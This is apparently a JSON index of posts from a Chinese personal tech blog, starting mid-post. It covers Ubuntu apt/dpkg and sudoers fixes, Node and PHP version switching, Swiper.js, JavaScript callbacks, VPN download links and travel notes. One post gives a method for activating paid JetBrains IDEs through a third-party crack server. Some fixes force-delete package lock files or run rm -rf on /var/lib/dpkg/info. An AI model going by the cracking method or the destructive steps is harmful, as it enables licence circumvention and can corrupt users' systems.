Toast.LENGTH_SHORT).show();\n\t}\n```\n`FKX02828RROAVHC0VOT05F` 是由我的支付宝收款二维码生成的 URL。如果你需使用这段支付代码，可以保存你自己的收款二维码浏览器扫描即可得到这串字符。（当然，那你不打算换，我也很乐意啊。改天一起出来喝咖啡哦）\n\n\n\n> ### 编译 APK 文件并发布\n\n#### 1. 编译 APK 并签名\n\n![](http://img.blog.csdn.net/20161206162011136?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZG9ua29yXw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n\n![](http://img.blog.csdn.net/20161206163112969?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZG9ua29yXw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n\n填写完整的签名信息。这里密码统一填写“android”，别名写个“key”即可。其他的信息根据实际情况和需求填写，并不很重要。\n\n> Key store path : 签名文件路径\nPassword : 签名密码\nConfirm : 确认密码\nAlias : 别名\nValidity ( years ) : 有限期 （年）\nFirst and Last Name : 全名\nOrganizational Unit : 组织单位\nOrganization : 组织\nCity or Locality : 城市或地方\nState or Province : 州或省\nCountry Code(XX) : 国家代码\n\n\n![](http://img.blog.csdn.net/20161206170726271?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZG9ua29yXw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n\n* 猛击下一步。在Build Type选择构建类型release。选择Finish这样就生成了签名文件。\n\n> APK Destination Folder : apk目标文件夹\nBuild Type : 构建类型\nrelease是发布版本用的签名文件\ndebug是debug用的签名文件 \n\n![](http://img.blog.csdn.net/20161206171532845?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZG9ua29yXw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n\n\n\n\n#### 2. 发布 APK 到酷安\n\n![](/img/https://developer.coolapk.com.png)\n\n\n### 最终 app 效果图\n\n![](/img/meizi.jpg)\n","tags":["开源","android"],"categories":["代码笔记"]},{"title":"解决安装curl依赖错误","url":"/2017/07/19/解决安装curl依赖错误/","content":"### 错误原因\n```\n$ sudo apt-get install curl\n```\n\n\nubuntu 安装软件报依赖问题是比较让人头疼的问题。就比如前几天在安装 `curl` 报出的这条错误/\n```\ncurl : 依赖: libcurl3-gnutls (= 7.47.0-1ubuntu2) 但是 7.47.0-1ubuntu2.2 正要被安装\n```\n\n一开始不清楚原因，执行了$ sudo apt-get update，出现了如下错误\n```\nE: 无法获得锁 /var/lib/apt/lists/lock - open (11: 资源暂时不可用) \nE: 无法对目录 /var/lib/apt/lists/ 加锁\n```\n\n### 解决方法，强制删除\n```\n$ sudo rm /var/cache/apt/archives/lock\n$ sudo rm /var/lib/dpkg/lock\n```\n\n### 重新安装 `libccurl3-gnutls`\n```\n$ sudo apt-get install libcurl3-gnutls=7.47.0-1ubuntu2\n```\n\n安装完后再执行一下 `$ sudo apt-get install curl` 即可\n\n\n<!-- more -->","tags":["curl"],"categories":["代码笔记"]},{"title":"Linux 作死自救历险记","url":"/2017/07/18/Linux-作死自救历险记/","content":"\n今天作死不小心修改了系统 `/etc/sudoers` 文件\n然后每次使用 `sudo` 的时候都会报如下错误\n\n```\n用户名不在sudoers文件中，此事将被报告\n\n```\n\n谷歌之后发现为了保护系统安全，sudoers文件一但被修改以后任何 `sudo` 命令都会被拒绝。现在我连把重新进 `/etc/sudoers` 文件的权限都没有了。更别提改回原文件了。啊啊啊啊啊～感觉自己仿佛在作死。。\n<!-- more -->\n\n\n继续谷歌寻找解决办法。\n\n对了，任何系统不都是有一个 `Recovery Mode` 嘛！有了。\n![](http://img.blog.csdn.net/20140117223051453?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZGFtb25oYW8=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n\n谷歌出 `ubuntu` 进 `Recovery Mode` 的方法。顺利调出 `Recovery Mode` 按 `e` 键进入编辑模式.\n\n```\n替换当前引导代码 `ro recovery nomodeset` 为 `rw single init=/bin/bash` \n```\n![](http://img.blog.csdn.net/20140117223441468?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZGFtb25oYW8=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n\n按下 `F10` 或 `Ctr + X` 进入单用户模式\n\n进入以后输入一下命令改回 `/etc/sudoers` 文件\n\n```\ncd /etc\nvim sudoers\n```\n\n`i` 编辑\n\n`ESC` 退出编辑模式\n`:` 命令行模式\n`wq` 写入文件并退出\n\n\n重启系统，输入 `sudo` 测试，成功解决。啊！泪流满面。。。。。\n\n### 总结\n\n这个故事告诉我们，没事别瞎jb作死。\n\n","tags":["sudoers"],"categories":["代码笔记"]},{"title":"ubuntu无法打开software-center","url":"/2017/07/08/ubuntu无法打开software-center/","content":"### 1.1 报错\n\n在ubuntu14.04LTS版本下，点击软件中心图标，过了一会软件未能启动，没有动静。用命令行启动报如下错误:\n```\nperrin@LittleBlack:~/Desktop$ sudo software-center\n  File \"/usr/bin/software-center\", line 140\n    print time.time()\n             ^\nSyntaxError: invalid syntax\n```\n\n### 1.2 原因\n```\n即ubuntu下有多个版本python共存时，默认使用的Python版本还是保持原样，\n不能修改为最新的python版本。若修改为最新版本，原有依赖旧版本python的应用可能会找不到相应的包从而导致出错。\n```\n\n### 1.3 解决办法\n将python链接默认指向Python2.7版本。\n```\nsudo mv /usr/bin/python /usr/bin/python_backup\nsudo ln -s /usr/bin/python2.7 /usr/bin/python\n```\n<!-- more -->\n","tags":["ubuntu","software-center"],"categories":["代码笔记"]},{"title":"ubuntu解决dpkg: 处理软件包 **** (--configure)时出错","url":"/2017/07/07/ubuntu解决dpkg-处理软件包-configure-时出错/","content":"\n原因：之前ubuntu误卸载了自带的python,导致这个问题、\n\ndpkg: 处理软件包 update-notifier-common (--configure)时出错：\n子进程 已安装 post-installation 脚本 返回错误状态 1\ndpkg: 依赖关系问题使得 ttf-mscorefonts-installer 的配置工作不能继续：\n\n1.$ sudo mv /var/lib/dpkg/info /var/lib/dpkg/info_old //现将info文件夹更名\n\n2.$ sudo mkdir /var/lib/dpkg/info //再新建一个新的info文件夹\n\n3.$ sudo apt-get update\n\n4.$ apt-get -f install\n\n5.$ sudo mv /var/lib/dpkg/info/* /var/lib/dpkg/info_old //执行完上一步操作后会在新的info文件夹下生成一些文件，现将这些文件全部移到info_old文件夹下\n\n6.$ sudo rm -rf /var/lib/dpkg/info //把自己新建的info文件夹删掉\n\n7.$ sudo mv /var/lib/dpkg/info_old /var/lib/dpkg/info //把以前的info文件夹重新改回名字\n\n<!-- more -->","tags":["python"],"categories":["代码笔记"]},{"title":"Node版本切换n","url":"/2017/06/14/Node版本切换n/","content":"### n是什么？\nde的一个模块，作者是TJ Holowaychuk（鼎鼎大名的Express框架作者），就像它的名字一样，它的理念就是简单：\n\n- 安装\n\n```\nnpm install -g n\n```\n\n- 安装完成之后\n\n直接输入n\n后输出当前已经安装的node版本以及正在使用的版本（前面有一个o\n），你可以通过移动上下方向键来选择要使用的版本，最后按回车生效。\n\n```\nn\n    0.10.1\n    0.10.15\no   0.10.21\n    0.11.8\n```\n\n> 如果没有出现版本，请先执行下面的代码安装指定的版本\n\n```\nsudo n 版本号\n```\n\n\n### 安装最新版本\n\n```\nn latest\n```\n\n### 安装稳定版本\n```\nn stable\n```\n<!-- more -->\n","tags":["前端","node.js"],"categories":["代码笔记"]},{"title":"Linux把PHP版本从7.0降级到5.6","url":"/2017/06/07/Linux把PHP版本从7-0降级到5-6/","content":"\n在您的系统上，如果您已安装了多个版本的PHP（例如PHP 7.1和PHP 5.6两者）。 PHP 7.1作为Apache和CLI的默认PHP运行。对于任何需求，您需要使用PHP 5.6。然后你不需要删除php 7.1。你可以简单地切换php版本为默认用于Apache和命令行。\n\n<!-- more -->\n例如，您的服务器安装了PHP 7.1和PHP 5.6两个版本。现在下面的例子将帮助你在两个版本之间切换。\n\n### 从PHP 5.6 => PHP 7.1\n\n默认PHP 5.6在您的系统上设置，您需要切换到PHP 7.1。\n#### Apache： –\n\n```\n$ sudo a2dismod php5.6\n$ sudo a2enmod php7.1\n$ sudo service apache2 restart\n```\n#### 链接到apache\n\n```\n$ update-alternatives --set php /usr/bin/php7.1\n```\n\n### 从PHP 7.1 => PHP 5.6\n默认PHP 7.1在您的系统上设置，您需要切换到PHP 5.6。\n\n#### Apache： –\n```\n$ sudo a2dismod php7.1\n$ sudo a2enmod php5.6\n$ sudo service apache2 restart\n```\n#### 链接到apache\n```\n$ sudo update-alternatives --set php /usr/bin/php5.6\n```\n","tags":["php"],"categories":["代码笔记"]},{"title":"Linux系统那些牛逼的命令","url":"/2017/04/25/Linux系统好玩的命令/","content":"### 打开Linux 命令行开启装逼模式\n![](/img/linux-terimal.png)\nLinux，这个号称“全地球人的操作系统”，以其免费、安全、稳定等优点获得人们的广泛好评！下面yarn就列出几点linux相对于Windows的优势。合法升级到最新版本却不需要花一分钱。(windows或者apple合法升级是需要掏钱的，windows与Linux比较差别大吧！)同一个硬件平台上最新的操作系统却比老的更快。(如果在一硬件平台上运行xp比较卡的话，那运行windows7是不可能的，而linux却相反，Linux与windows相比大大不同)\n<!-- more -->\n\n如果你不喜欢默认的桌面环境，可以非常容易的自行安装其他的界面。­（比如你在linux安装了gnome和kde程序，那么切换时只需要输入：switchdesk gnome就能切换到gnome桌面环境了，输入switchdesk kde就能切换到kde桌面环境了；当然，现在windows下也能体验kde程序，不过首先需要安装kde installer【kde安装程序】，而且基于windows的kde程序现在好像还处于alpha【内部测试】阶段）\n一个命令就可以安装二十个程序。windows与Linux有得比吗？\n\n### 让系统自动为用户所安装的软件更新。\n\n可以在N台机器上安装同一份OS(意为操作系统)拷贝而无须担心协议限制或激活码。\n可以自由分发该操作系统及其他运行其上的软件而不会违犯法律，政治或伦理道德，因为它本身就提倡这么做的。\n可以裸奔（无需杀毒软件，反广告／间谍防护软件），甚至可以数月不用重启机器，因为它具有独特的内存管理方式。（大家可以想一下如果windows下裸奔会是怎样的后果；windows如果很长一段时间不关机或是重启，那么它运行肯定不会有刚开机时那么流畅），所以说安全上Linux与windows比较没意思。\n\n### 从来不用磁盘碎片整理。\n\n尝试软件，觉得不喜欢，就删掉他，而且知道他不会在什么注册表里留下一些垃圾可能导致把我的系统搞慢。而比较的windows呢？时间长了得重装系统！犯了重大错误而导致全新重装系统，也不过花去了1小时不到的时间，因为我把我的数据放在了独立于操作系统和程序的分区。\n在一台3岁的老电脑上可以有如win7那样超酷的登录效果…少于40秒，这已经是将我输入用户名和密码并登录计算在内了。(yarn的系统开机只需要10秒到20秒，这一点windows8与Linux有得比较。可毕竟还没正式发行)\n\n合法自定义任何我想要的东西，包括我最喜爱的程序。我甚至可以跟踪软件开发者并向他们问问题，提意见，如果我愿意的话，也可以参与到真正的软件设计和开发进程中去。而相比的windows可能告你侵权。超过4个的文字处理窗口，听音乐，玩超酷的桌面效果，联系一个大型的社区，并同时运行着firefox(火狐浏览器)，即时通讯以及email客户端，而不必求爷爷告奶奶的要什么令我的系统可以运作的代码，而不会把系统变慢。\n\n使用”dpkg –get-selections > pkg.list”命令来获得一个完整详尽的已装软件列表，备份我的/etc和/home文件夹到一个独立分区，然后你就可以随时恢复你的系统了，而且超简单。\n\n同时运行多个桌面，甚至可以让多用户同时登录并使用该机器。\n\n无损调整分区大小而不用担心会丢失数据。(现在windows7也自带这个功能，windows其他版本必须借助第三方软件才能做到)\n硬件可以使用超过五年而无须更换\n\n可以在OS(意为操作系统)安装的同时浏览网页！(windows下这是不可能的)使用几乎所有的硬件，因为系统已经自带了驱动。\n\n### 无处不在的hello Linux\n好了，废话说了一大堆。那既然linux优点这么多。那咱么就来玩玩呗。瞬间开启装逼模式**Ctrl+Alt+T** 打开 Linux 终端（俗称命令行）老规矩，先要给咱们的老大哥hello world拜个码头。\n\n![hello world](/img/hello-linux.png)\n\n和之前的php输出方式一样啊，好的。咱们在继续学！\n### 常用命令\n\n- 1.1 删除空文件夹\n```\nrmdir 文件夹名称\n```\n- 1.2 删除文件夹内所有文件\n```\nrm -rf 文件夹名称\n```\n\n- 2.1 新建文件夹\n```\nmkdir 文件夹名称\n```\n\n- 2.2 新建文件\n```\ntouch 文件名称\n```\n","tags":["Linux","黑客","命令行"],"categories":["代码笔记"]},{"title":"It's time to unstall your sublime","url":"/2017/04/25/unstall-your-sublime-instead-of-atom/","content":"### Atom 更为先进的文本代码编辑器\n![atom](/img/aotm.png)\n在我没有遇到Atom之前，我一直以为sublime text是最精简强大的代码编辑器。直到Atom的出现，让我彻底改变了这个想法。Atom同样的轻巧，但功能较sublime Text更为强大。如果你也在寻找一款比较喜欢轻便型的IDE，Atom我会马上推荐给你。\n<!-- more -->\n","tags":["IDE","atom"],"categories":["代码笔记"]},{"title":"Swiper.js ","url":"/2017/04/23/so-powerful-mobile-silde-framwork-swiper/","content":"\n### 强大的移动端触摸欢动插件Swiper\n![Swiper](/img/swiper1.png)\nSwiper常用于移动端网站的内容触摸滑动.Swiper是纯javascript打造的滑动特效插件，面向手机、平板电脑等移动终端。Swiper能实现触屏焦点图、触屏Tab切换、触屏多图切换等常用效果。Swiper开源、免费、稳定、使用简单、功能强大，是架构移动终端网站的重要选择！\n<!-- more -->\n\n### 引用文件\n\n- 在head中引入swiper.js和swiper.css文件\n\n```\n//引入js\n<script src=\"//cdn.bootcss.com/Swiper/3.4.2/js/swiper.min.js\"></script>\n\n//引入css\n<link href=\"//cdn.bootcss.com/Swiper/3.4.2/css/swiper.min.css\" rel=\"stylesheet\">\n```\n\n- 实例化\n\n```\n//初始化一个Swiper\nnew Swiper(swiperContainer,parameters)\n\n//swiperContainer swiper的css选择器\nparameters swiper自定义参数（可选）\n```\n\n\n- swiper常用参数\n\n```\n<script>\n\t\tnew Swiper('.swiper-container',{\n\t\t    autoplay:1000,//1000ms自动播放一次\n\t\t\tloop: true//循环播放\n\t\t\tinitialSlide :2,//设定初始化时slide的索引。\n\t\t\tdirection : 'vertical',//\tSlides的滑动方向，可设置水平(horizontal)或垂直(vertical)。\n\t\t\tspeed:300,//\n\t\t\twidth : 800, //你的slide宽度\n\t\t\t\t\t\t//全屏  width : window.innerWidth,\n\t\t\tpagination : '.swiper-pagination',//分页器容器\n\t\t})\n</script>\n```\n\n\n### 图解Swiper\n![Swiper](/img/swiper-%E5%9B%BE%E8%A7%A3.png)\n\n如果你正好需要上图某个组件，你可以在html中添加swiper指定的类，比如\n\n```\n        <!--导航-->\n    <div class=\"swiper-button-prev\"></div>\n\t<div class=\"swiper-button-next\"></div>\n\t\n\t<!--分页-->\n\t<div class=\"swiper-pagination\"></div>\n\t\n\t<!--滚动条-->\n\t<div class=\"swiper-scrollbar\"></div>\n```\n\n更多属性参考Swiper[api文档传送门](http://www.swiper.com.cn/api/index.html)\n\n\n\n","tags":["swiper.js"],"categories":["代码笔记"]},{"title":"国外这么好玩的网站你知道吗？","url":"/2017/04/13/Instagram_Youtube_google/","content":"### 国外流行的图片社交网站\n![Instagram](/img/Instagram.png)\n前段时间有朋友看到我博客上面有facebook和Instagram的链接就跑来问我是如何登陆上去的。由于国内互联网政策的xx原因，这些网站在大陆都访问不了。然而面对这么好玩的东西又怎么能阻挡的了我们向往自由的步伐呢！万一还能撩个妹，约个会，偶个遇，约个X啥的呢。。。哈哈，我是说万一。\n好了，以上言论纯属一本正经的胡说八道。下面我要开始发大宝了哈!小心我的大刀早已饥渴难耐了,hhhhh\n\n<!-- more -->\n\n### 降龙十八掌 第一式\n- 安装翻墙软件\n\n安卓下载：[SuperVpn](/img/Super%20VPN%20-%20Best%20Free%20Proxy_3.5_apk-dl.com.apk) \n\nwindows下载：[Lantern](https://raw.githubusercontent.com/getlantern/lantern-binaries/master/lantern-installer-beta.exe)\n\nubuntu下载：[ubuntu](https://raw.githubusercontent.com/getlantern/lantern-binaries/master/lantern-installer-beta-64-bit.deb)\n\n目前蓝灯并没有iOS版本，所有App Store上的蓝灯均为假冒。\n\n\n### 降龙十八掌 第二式\n- 必玩的网站\n\n**Instagram** 是一款最初运行在iOS平台上的移动应用，以一种快速、美妙和有趣的方式将你随时抓拍下的图片分享\n\n**Instagram** 提供了这样一套顺畅的操作流程：拍照--滤镜特效（以lomo风为主的11种照片特效）。强大的滤镜功能让你拍的照片变得更加漂亮更加专业！我第一次用的时候也是被它如此强大的滤镜功能和视频剪辑功能所吸引！够强大。后期的版本中发现了一个直播的功能，突然就有一种玩快手的感觉。不过是一些老外发的一些日常逗比的视频。哈哈，看来分享真的是全世界的网民的共同需求啊！！\n\n[我的 Instagram](https://www.instagram.com/adymilk/)\n\n**facebook** 居然被人翻译脸书。。让人费解！不过作为世界上每天流量最大的网站，在这里找个人练练英文还是不错的。facebook的功能比较多，好在最后把聊天功能单独分离出来了。叫做**messenger** 可以在好多应用商店直接下载到。软件界面是谷歌推荐的Material Design风格，美的让我欲罢不能。。哈哈哈，遇到太美的产品设计我总是不能自已！！\n\n[我的 facebook](https://www.facebook.com/JACKDECELOP)\n\n至于 **Twitter** 我注册的时候就被封号了，也不清楚是什么原因。后来也就不想玩了，美国版的`微博`。还不如玩我们的微博呢。\n\n说道 **youtube** 不得不说挺牛逼的。最为世界上最大的视频网站，自从被谷歌收购以后越干越大！(有些大陆禁片你应该有学会分辨好坏的能力，毕竟这是一家美国公司的视频网站。国内屏蔽必定有他的道理，你知道国人是比较有围观效应的。随便几个人年轻人被洗脑后都能去`起义`，可怕！)先抛开谷歌对信息管制的政策不谈，他的技术确实牛逼。如果国内允许访问**youtube**的话，那么像爱奇艺、土豆、腾讯视频、优酷视频之类的视频网站可能就要面临转型的危险了！国内视频网站的收益方式主要靠在视频前加播广告，最长广告时长达120秒。youtube视频播放前加播的广告最长5秒，5秒后可点击跳过。大多数视频没有广告。国内Bilibili这方面做的不错！而且广告的质量比较高，基本是一些科技，公益类的广告。相比国内网站的一个120秒的奥妙洗衣液来说，youtube的这种广告更让人易于接受！\n\n![](/img/youtube.png)\n\n谷歌回归是一个国策问题，对于我们用户来说选择享受到最顶尖的技术和服务是我的权利。对于一个国家的国情和互联网经济来说，这个是需要在必要的时候采取宏观调控的。想象一下如果谷歌明天进入中国，那么国产互联网企业必定会死伤一大片。但从另一个角度来说，谷歌回归是大势所趋，这个只是时间问题。所以留下的时间里也让国内互联网企业感到危机感，迫使他们改革创新，做出更好的服务或开发出更好的产品来留住用户。俗话说的好：**生于忧患,死于安乐**  \n\n期待国内互联网企业能够越来越好，也希望谷歌能够早日回归！\n\n","tags":["vpn","Instagram","Facebook"],"categories":["生活笔记"]},{"title":"深圳自由行（图文 + 视频）","url":"/2017/04/10/ShenZhenVideo/","content":"### 开篇\n![Instagram](/img/traval-in-shenzheng.png)\n从上海出发，前往深圳。凌晨1点半抵达深圳宝安国际机场。这是我第一次来南方的城市，激动中带有些许期待!!<br>计划旅行攻略中的目的地有：美丽的海边**大梅沙度假村**、中国电子第一街**华强北**、改革开放总设计师邓小平画像**荔枝公园**以及深圳的地表建筑**帝王大厦**都是一些非常有意义和象征性的地方。最后没想到还有意外收获....\n<!-- more -->\n\n### 视频剪辑\n\t\n{% dplayer \"url=http://0551shengteng.cn/ueditor/php/upload/video/20170624/2017-From-ShangHai-To-ShenZhen.mp4\" \"addition=https://dplayer.daoapp.io/bilibili?aid=4157142\" \"api=http://dplayer.daoapp.io\" \"pic=http://home.ustc.edu.cn/~mmmwhy/GEM.jpg\" \"id=9E2E3368B56CDBB4\" \"loop=yes\" \"theme=#FADFA3\" \"autoplay=false\" \"token=tokendemo\" %}\n\n\n<!-- <video src=\"/img/ShenZhen-video.mp4\" controls=\"controls\" autoplay=\"true\" width=\"100%\"></video> -->\n\n相对于上一次普陀山的海，这一次大梅沙的海才算是真正意义上的大海了。是我想象中的那种蔚蓝色的大海，无边无际。海水很咸、很凉、很舒服！海边风很大，不过深圳的温度高啊，一点也不会感觉到冷。凉快的很！我坐在海边的石头上，撩着海水。捧一些在手心中，海水清澈透明到可以看到手心的纹路。海水还很软，很滑。稍不留神就会从你的指尖流走。此时我真想脱掉衣服，跳进去玩个痛快！\n\n\n\n### 攻略篇\n制定好完备的旅行攻略和尽量减少乘坐交通工具的时间，会让你的旅行性价比更高！而不是没有方向，走到哪儿看到哪儿。那样有时候很危险，有些时候会让你不知所措。我来到某个陌生的城市之前，必定是做好了前期的准备，包括上网能够很快了解到的当地的风土人情，交通情况，地理位置，周边环境。做到心中有数，当我真正来到当地以后，我会从心里告诉自己我就是本地人。对，要的就是叶良辰的那种自信。哈哈，所以每次我混进其他大学校园的时候总是进出自如。然而我朋友却时常在校门口被保安叫住，无奈我还要假装成本校学生带他进去。哈哈～\n保安：“喂，那个同学！你是那个班级的，班主任叫什么？”\n我赶紧过去：“叔叔，他是我朋友。我是14级2班的，班主任是xx....”\n\n\n#### 骑单车\n\n我发现我是爱上了骑行的感觉，骑行也会让你看起来更容易像本地人。无论是上海从火车站骑行到南京西路，还是在深圳从五和骑行到华强北。总会有一些路人向我问路！试问，身为一个外地人成功变身指路人是一种怎样的体验？\n\n\n#### 美团在手，想吃就走\n\n擅用美团，就算在机场你也可以放心的想吃就吃！\n\n![浦东国际机场-真功夫：15￥](/img/%E6%B5%A6%E4%B8%9C%E5%9B%BD%E9%99%85%E6%9C%BA%E5%9C%BA-%E7%9C%9F%E5%8A%9F%E5%A4%AB.jpg)\n\n一加3T拍摄，如此高清。赞！一加3T不愧为安卓性价比之王！然而一加CEO\t刘作虎不做广告宣传单纯靠用户口碑相传导致很多人都没有听说过这个手机品牌。\n\n![深圳宝安机场-拿铁咖啡：19￥](/img/%E6%B7%B1%E5%9C%B3%E5%AE%9D%E5%AE%89%E6%9C%BA%E5%9C%BA-%E6%B1%89%E5%A0%A1%E7%8E%8B.jpg)\n\n老实说，我是路痴。一个真正的路痴去到一个陌生的地方需要完全凭借地图导航的帮助。所以我要感谢互联网的时代哈哈哈！！！！让说走就走的旅行变得So Easy!\n\n> 旅行不是为了旅行而旅行，行走不是为了行走而行走，读书更不是为了读书而读书。\n\n\n以前不太读懂这些话，现在慢慢的会发现其实这些都是相辅相成的。旅行不因没钱而放弃（勤奋点，努力挣钱把下一次旅行作为近期的奋斗目标），行走不因懒惰而放弃（勤奋点，早睡早起让自己多看看这个城市不一样的风景），读书不因枯燥而放弃（勤奋点，多看多想用别人优秀的思想来补充自己匮乏的大脑）\n\n#### 边旅行赚钱\n\n这个想法一听，可能你会觉得我在说笑。或者你觉得那样可能会丢失在旅行的乐趣。其实相反！旅行赚钱的方法可能因人而异。但只要你能够善于发现不同城市的产品特点，分析市场行情。果断出击，赚些回家的路费还是绰绰有余的。\n另外，掌握一门技能还是最重要的。就比如支付宝里面有一个叫做‘到位’的功能。如果你有能力给予求助者帮助，技能赚钱也就变得相当容易了。\n\n### 华强北\n\n![中国电子第一街-华强北](http://static.oneplus.cn/data/attachment/forum/201706/10/144951zvv8xl3jj01vgzxx.jpg.w_768.jpg)\n\n 华强北街30年前，是深圳一条再普通不过的街，甚至算不上一条街，只不过是上步工业区的一条厂区马路而已。但深圳30年改革开放，让华强北街神奇地崛起，成为中国电子第一街，成为有世界影响的电子商业街。现在，当山寨潮流犹如春天到来时的冰雪一般迅速消融之后，深圳华强北电子市场，正在经历着一个艰难而痛苦的时刻。\n  最近华强北开始热闹起来。一些手机卖场开始进入装修阶段，各个手机品牌陆续进场，现在华强北每天都有新店开张，都是卖智能手机。一夜之间，深圳冒出了THL、卓普、亚力通、科酷、欧科、心动等手机品牌。深圳山寨手机迎来了转型升级，闯进智能时代。有人说，深圳山寨手机的第二春来了——它们纷纷打出自有品牌。\n\n\n### 下一站 前往南京\n\n![](http://static.oneplus.cn/data/attachment/forum/201704/16/234232wjzihyzg8bghqyyp.jpg.w_768.jpg)\n\n  南京站的视频丢了，比较可惜。\n\n### 最后致谢\n\n视频剪辑工具：VUE 和 小影\n\n视频存储：七牛云\n\n服务器支持：coding\n\npower by hexo\n","tags":["旅行","深圳","华强北"],"categories":["生活笔记"]},{"title":"不为人知的互联网","url":"/2016/12/01/2016-12-01/","content":"![](http://i1.piimg.com/567571/f453bcadf7803959.png)\n中国的万里长城是又长又厚，对外不仅可以抵御外敌，对内还可以保护自己的国民(这是行话，由于国内政策原因**你懂的不能直接说)。\n<!-- more -->\n但是在如今高速发展的信息化时代，学习交流是我们的权利。特别是像Google这样的超级科技公司，他的一些科技是那么的牛逼以至于让我这样的科技控欲罢不能。如何访问谷歌，如何及时获取世界上最前沿的学习资源，怎样真正实现地球村的美好愿景？带着这些问题，本篇文章接下来会为你解决！\n\n### 整装待发\n**Lantern下载地址** \nPC 版本： [http://pan.baidu.com/s/1eR75OD8](http://pan.baidu.com/s/1eR75OD8) 密码: w55g\nAndroid版本： [http://pan.baidu.com/s/1boQ8JO7](http://pan.baidu.com/s/1boQ8JO7) 密码: nvr8\n[图片预览](http://p1.bpimg.com/567571/eed1c21399073468.png)\n\n如果链接失效，请到下面的Lantern官方Github下载\n[https://github.com/getlantern/forum](https://github.com/getlantern/forum)\n\n### 全军出击\n墙外优秀网站\n1、谷歌搜索 ([www.google.com](www.google.com))\n2、youtube ([www.youtube.com](www.youtube.com))\n3、谷歌地图 ([www.maps.google.com](www.maps.google.com))\n4、谷歌Play ([www.play.google.com](www.play.google.com))\n5、谷歌Gmail ([www.mail.google.com](www.mail.google.com))\n6、谷歌云盘 ([www.drive.google.com](www.drive.google.com))\n7、Facebook ([www.facebook.com](www.facebook.com))\n8、Twitter ([www.twitter.com](www.twitter.com))\n9、Instagram ([www.instagram.com](www.instagram.com))\n\n### first blood\n[谷歌机器人Google Rebot](https://www.youtube.com/watch?v=9kawY1SMfY0)\n[德国工业](https://www.youtube.com/watch?v=igwUyYMjhBM)\n","tags":["vpn"],"categories":["生活笔记"]},{"title":"JetBrains系列产品破解教程","url":"/2016/11/21/JetBrains系列产品破解教程/","content":"\nJetBrains系列的IDE都非常棒，支持多种插件和主题。深受广大程序员的喜爱。可能有人会说他喜欢用Sublime Text，是因为它的轻便和支持永久试用(相当于免费比如我之前)。\n<!-- more -->\n但是有的人确实喜欢试用JetBrains系列的软件，因为它的功能强大。但是问题来了，它的系列软件是收费的。如何破呢？本篇文章就是来解决这个问题的！\n\n### 获取注册码\n大神搭建的破解服务器地址：http://idea.lanyus.com/\n- 点击获取注册码\n- 复制注册码后去你的JetBrains软件填写注册码即可成功激活\n\n\n","tags":["JetBrains"],"categories":["代码笔记"]},{"title":"JavaScript callback function 理解","url":"/2016/10/25/JavaScript-callback-function-理解/","content":"最近做的一个项目中用到了callback函数，于是就研究了下总结下我对javascript callback的理解；首先从callback的字面翻译“回调”可以理解这是一个函数被调用的机制当我们遇到一个名词首先可能是百度谷歌搜索看官方是怎么解释的；\n<!-- more -->\n### 定义\n回调函数是什么？\n## 看维基的 Callback_(computer_programming) 条目:\n> In computer programming, a callback is a reference to a piece of executable code that is passed as an argument to other code.\n\n### jQuery文档How jQuery Works#Callback_and_Functio…条目：\n> A callback is a function that is passed as an argument to another function and is executed after its parent function has completed. The special thing about a callback is that functions that appear after the \"parent\" can execute before the callback executes. Another important thing to know is how to properly pass the callback. This is where I have often forgotten the proper syntax.\n\n### 百科：回调函数\n> 回调函数就是一个通过函数指针调用的函数。如果你把函数的指针（地址）作为参数传递给另一个函数，当这个指针被用为调用它所指向的函数时，我们就说这是回调函数。回调函数不是由该函数的实现方直接调用，而是在特定的事件或条件发生时由另外的一方调用的，用于对该事件或条件进行响应。\n\n因此，回调本质上是一种设计模式，并且jQuery(包括其他框架)的设计原则遵循了这个模式。\n\n在JavaScript中，回调函数具体的定义为：函数A作为参数(函数引用)传递到另一个函数B中，并且这个函数B执行函数A。我们就说函数A叫做回调函数。如果没有名称(函数表达式)，就叫做匿名回调函数。\n\n因此callback 不一定用于异步，一般同步(阻塞)的场景下也经常用到回调，比如要求执行某些操作后执行回调函数。\n### 例子\n```\nvar func1=function(callback){\n    //do something.\n    (callback && typeof(callback) === \"function\") && callback();\n}\n\nfunc1(func2);\n    var func2=function(){\n}\n```\n异步回调的例子：\n```\n$(document).ready(callback);\n\n$.ajax({\n  url: \"test.html\",\n  context: document.body\n}).done(function() { \n  $(this).addClass(\"done\");\n}).fail(function() { alert(\"error\");\n}).always(function() { alert(\"complete\"); \n});\n/**\n注意的是，ajax请求确实是异步的,不过这请求是由浏览器新开一个线程请求,当请求的状态变更时,如果先前已设置回调,这异步线程就产生状态变更事件放到 JavaScript引擎的处理队列中等待处理。见：http://www.phpv.net/html/1700.html\n*/\n```\n","tags":["前端"],"categories":["代码笔记"]},{"title":"win 10更改用户名及取消开机密码","url":"/2016/10/19/win-10更改用户名及取消开机密码/","content":"本教程内容如下\n1、更改win 10登陆用户名\n2、取消开机密码\n方法请点击阅读全文查看。\n<!-- more -->\n### 更改win 10登陆用户名\n- 操作步骤\n1、右键计算机管理\n2、本地用户和组\n3、用户\n4、选择您须要更改的名称即可\n如下图\n\n![](/img/win_group.png)\n\n### 取消开机密码\n- 操作步骤\n1、win+R 键盘打开运行窗口，如下图\n2、输入 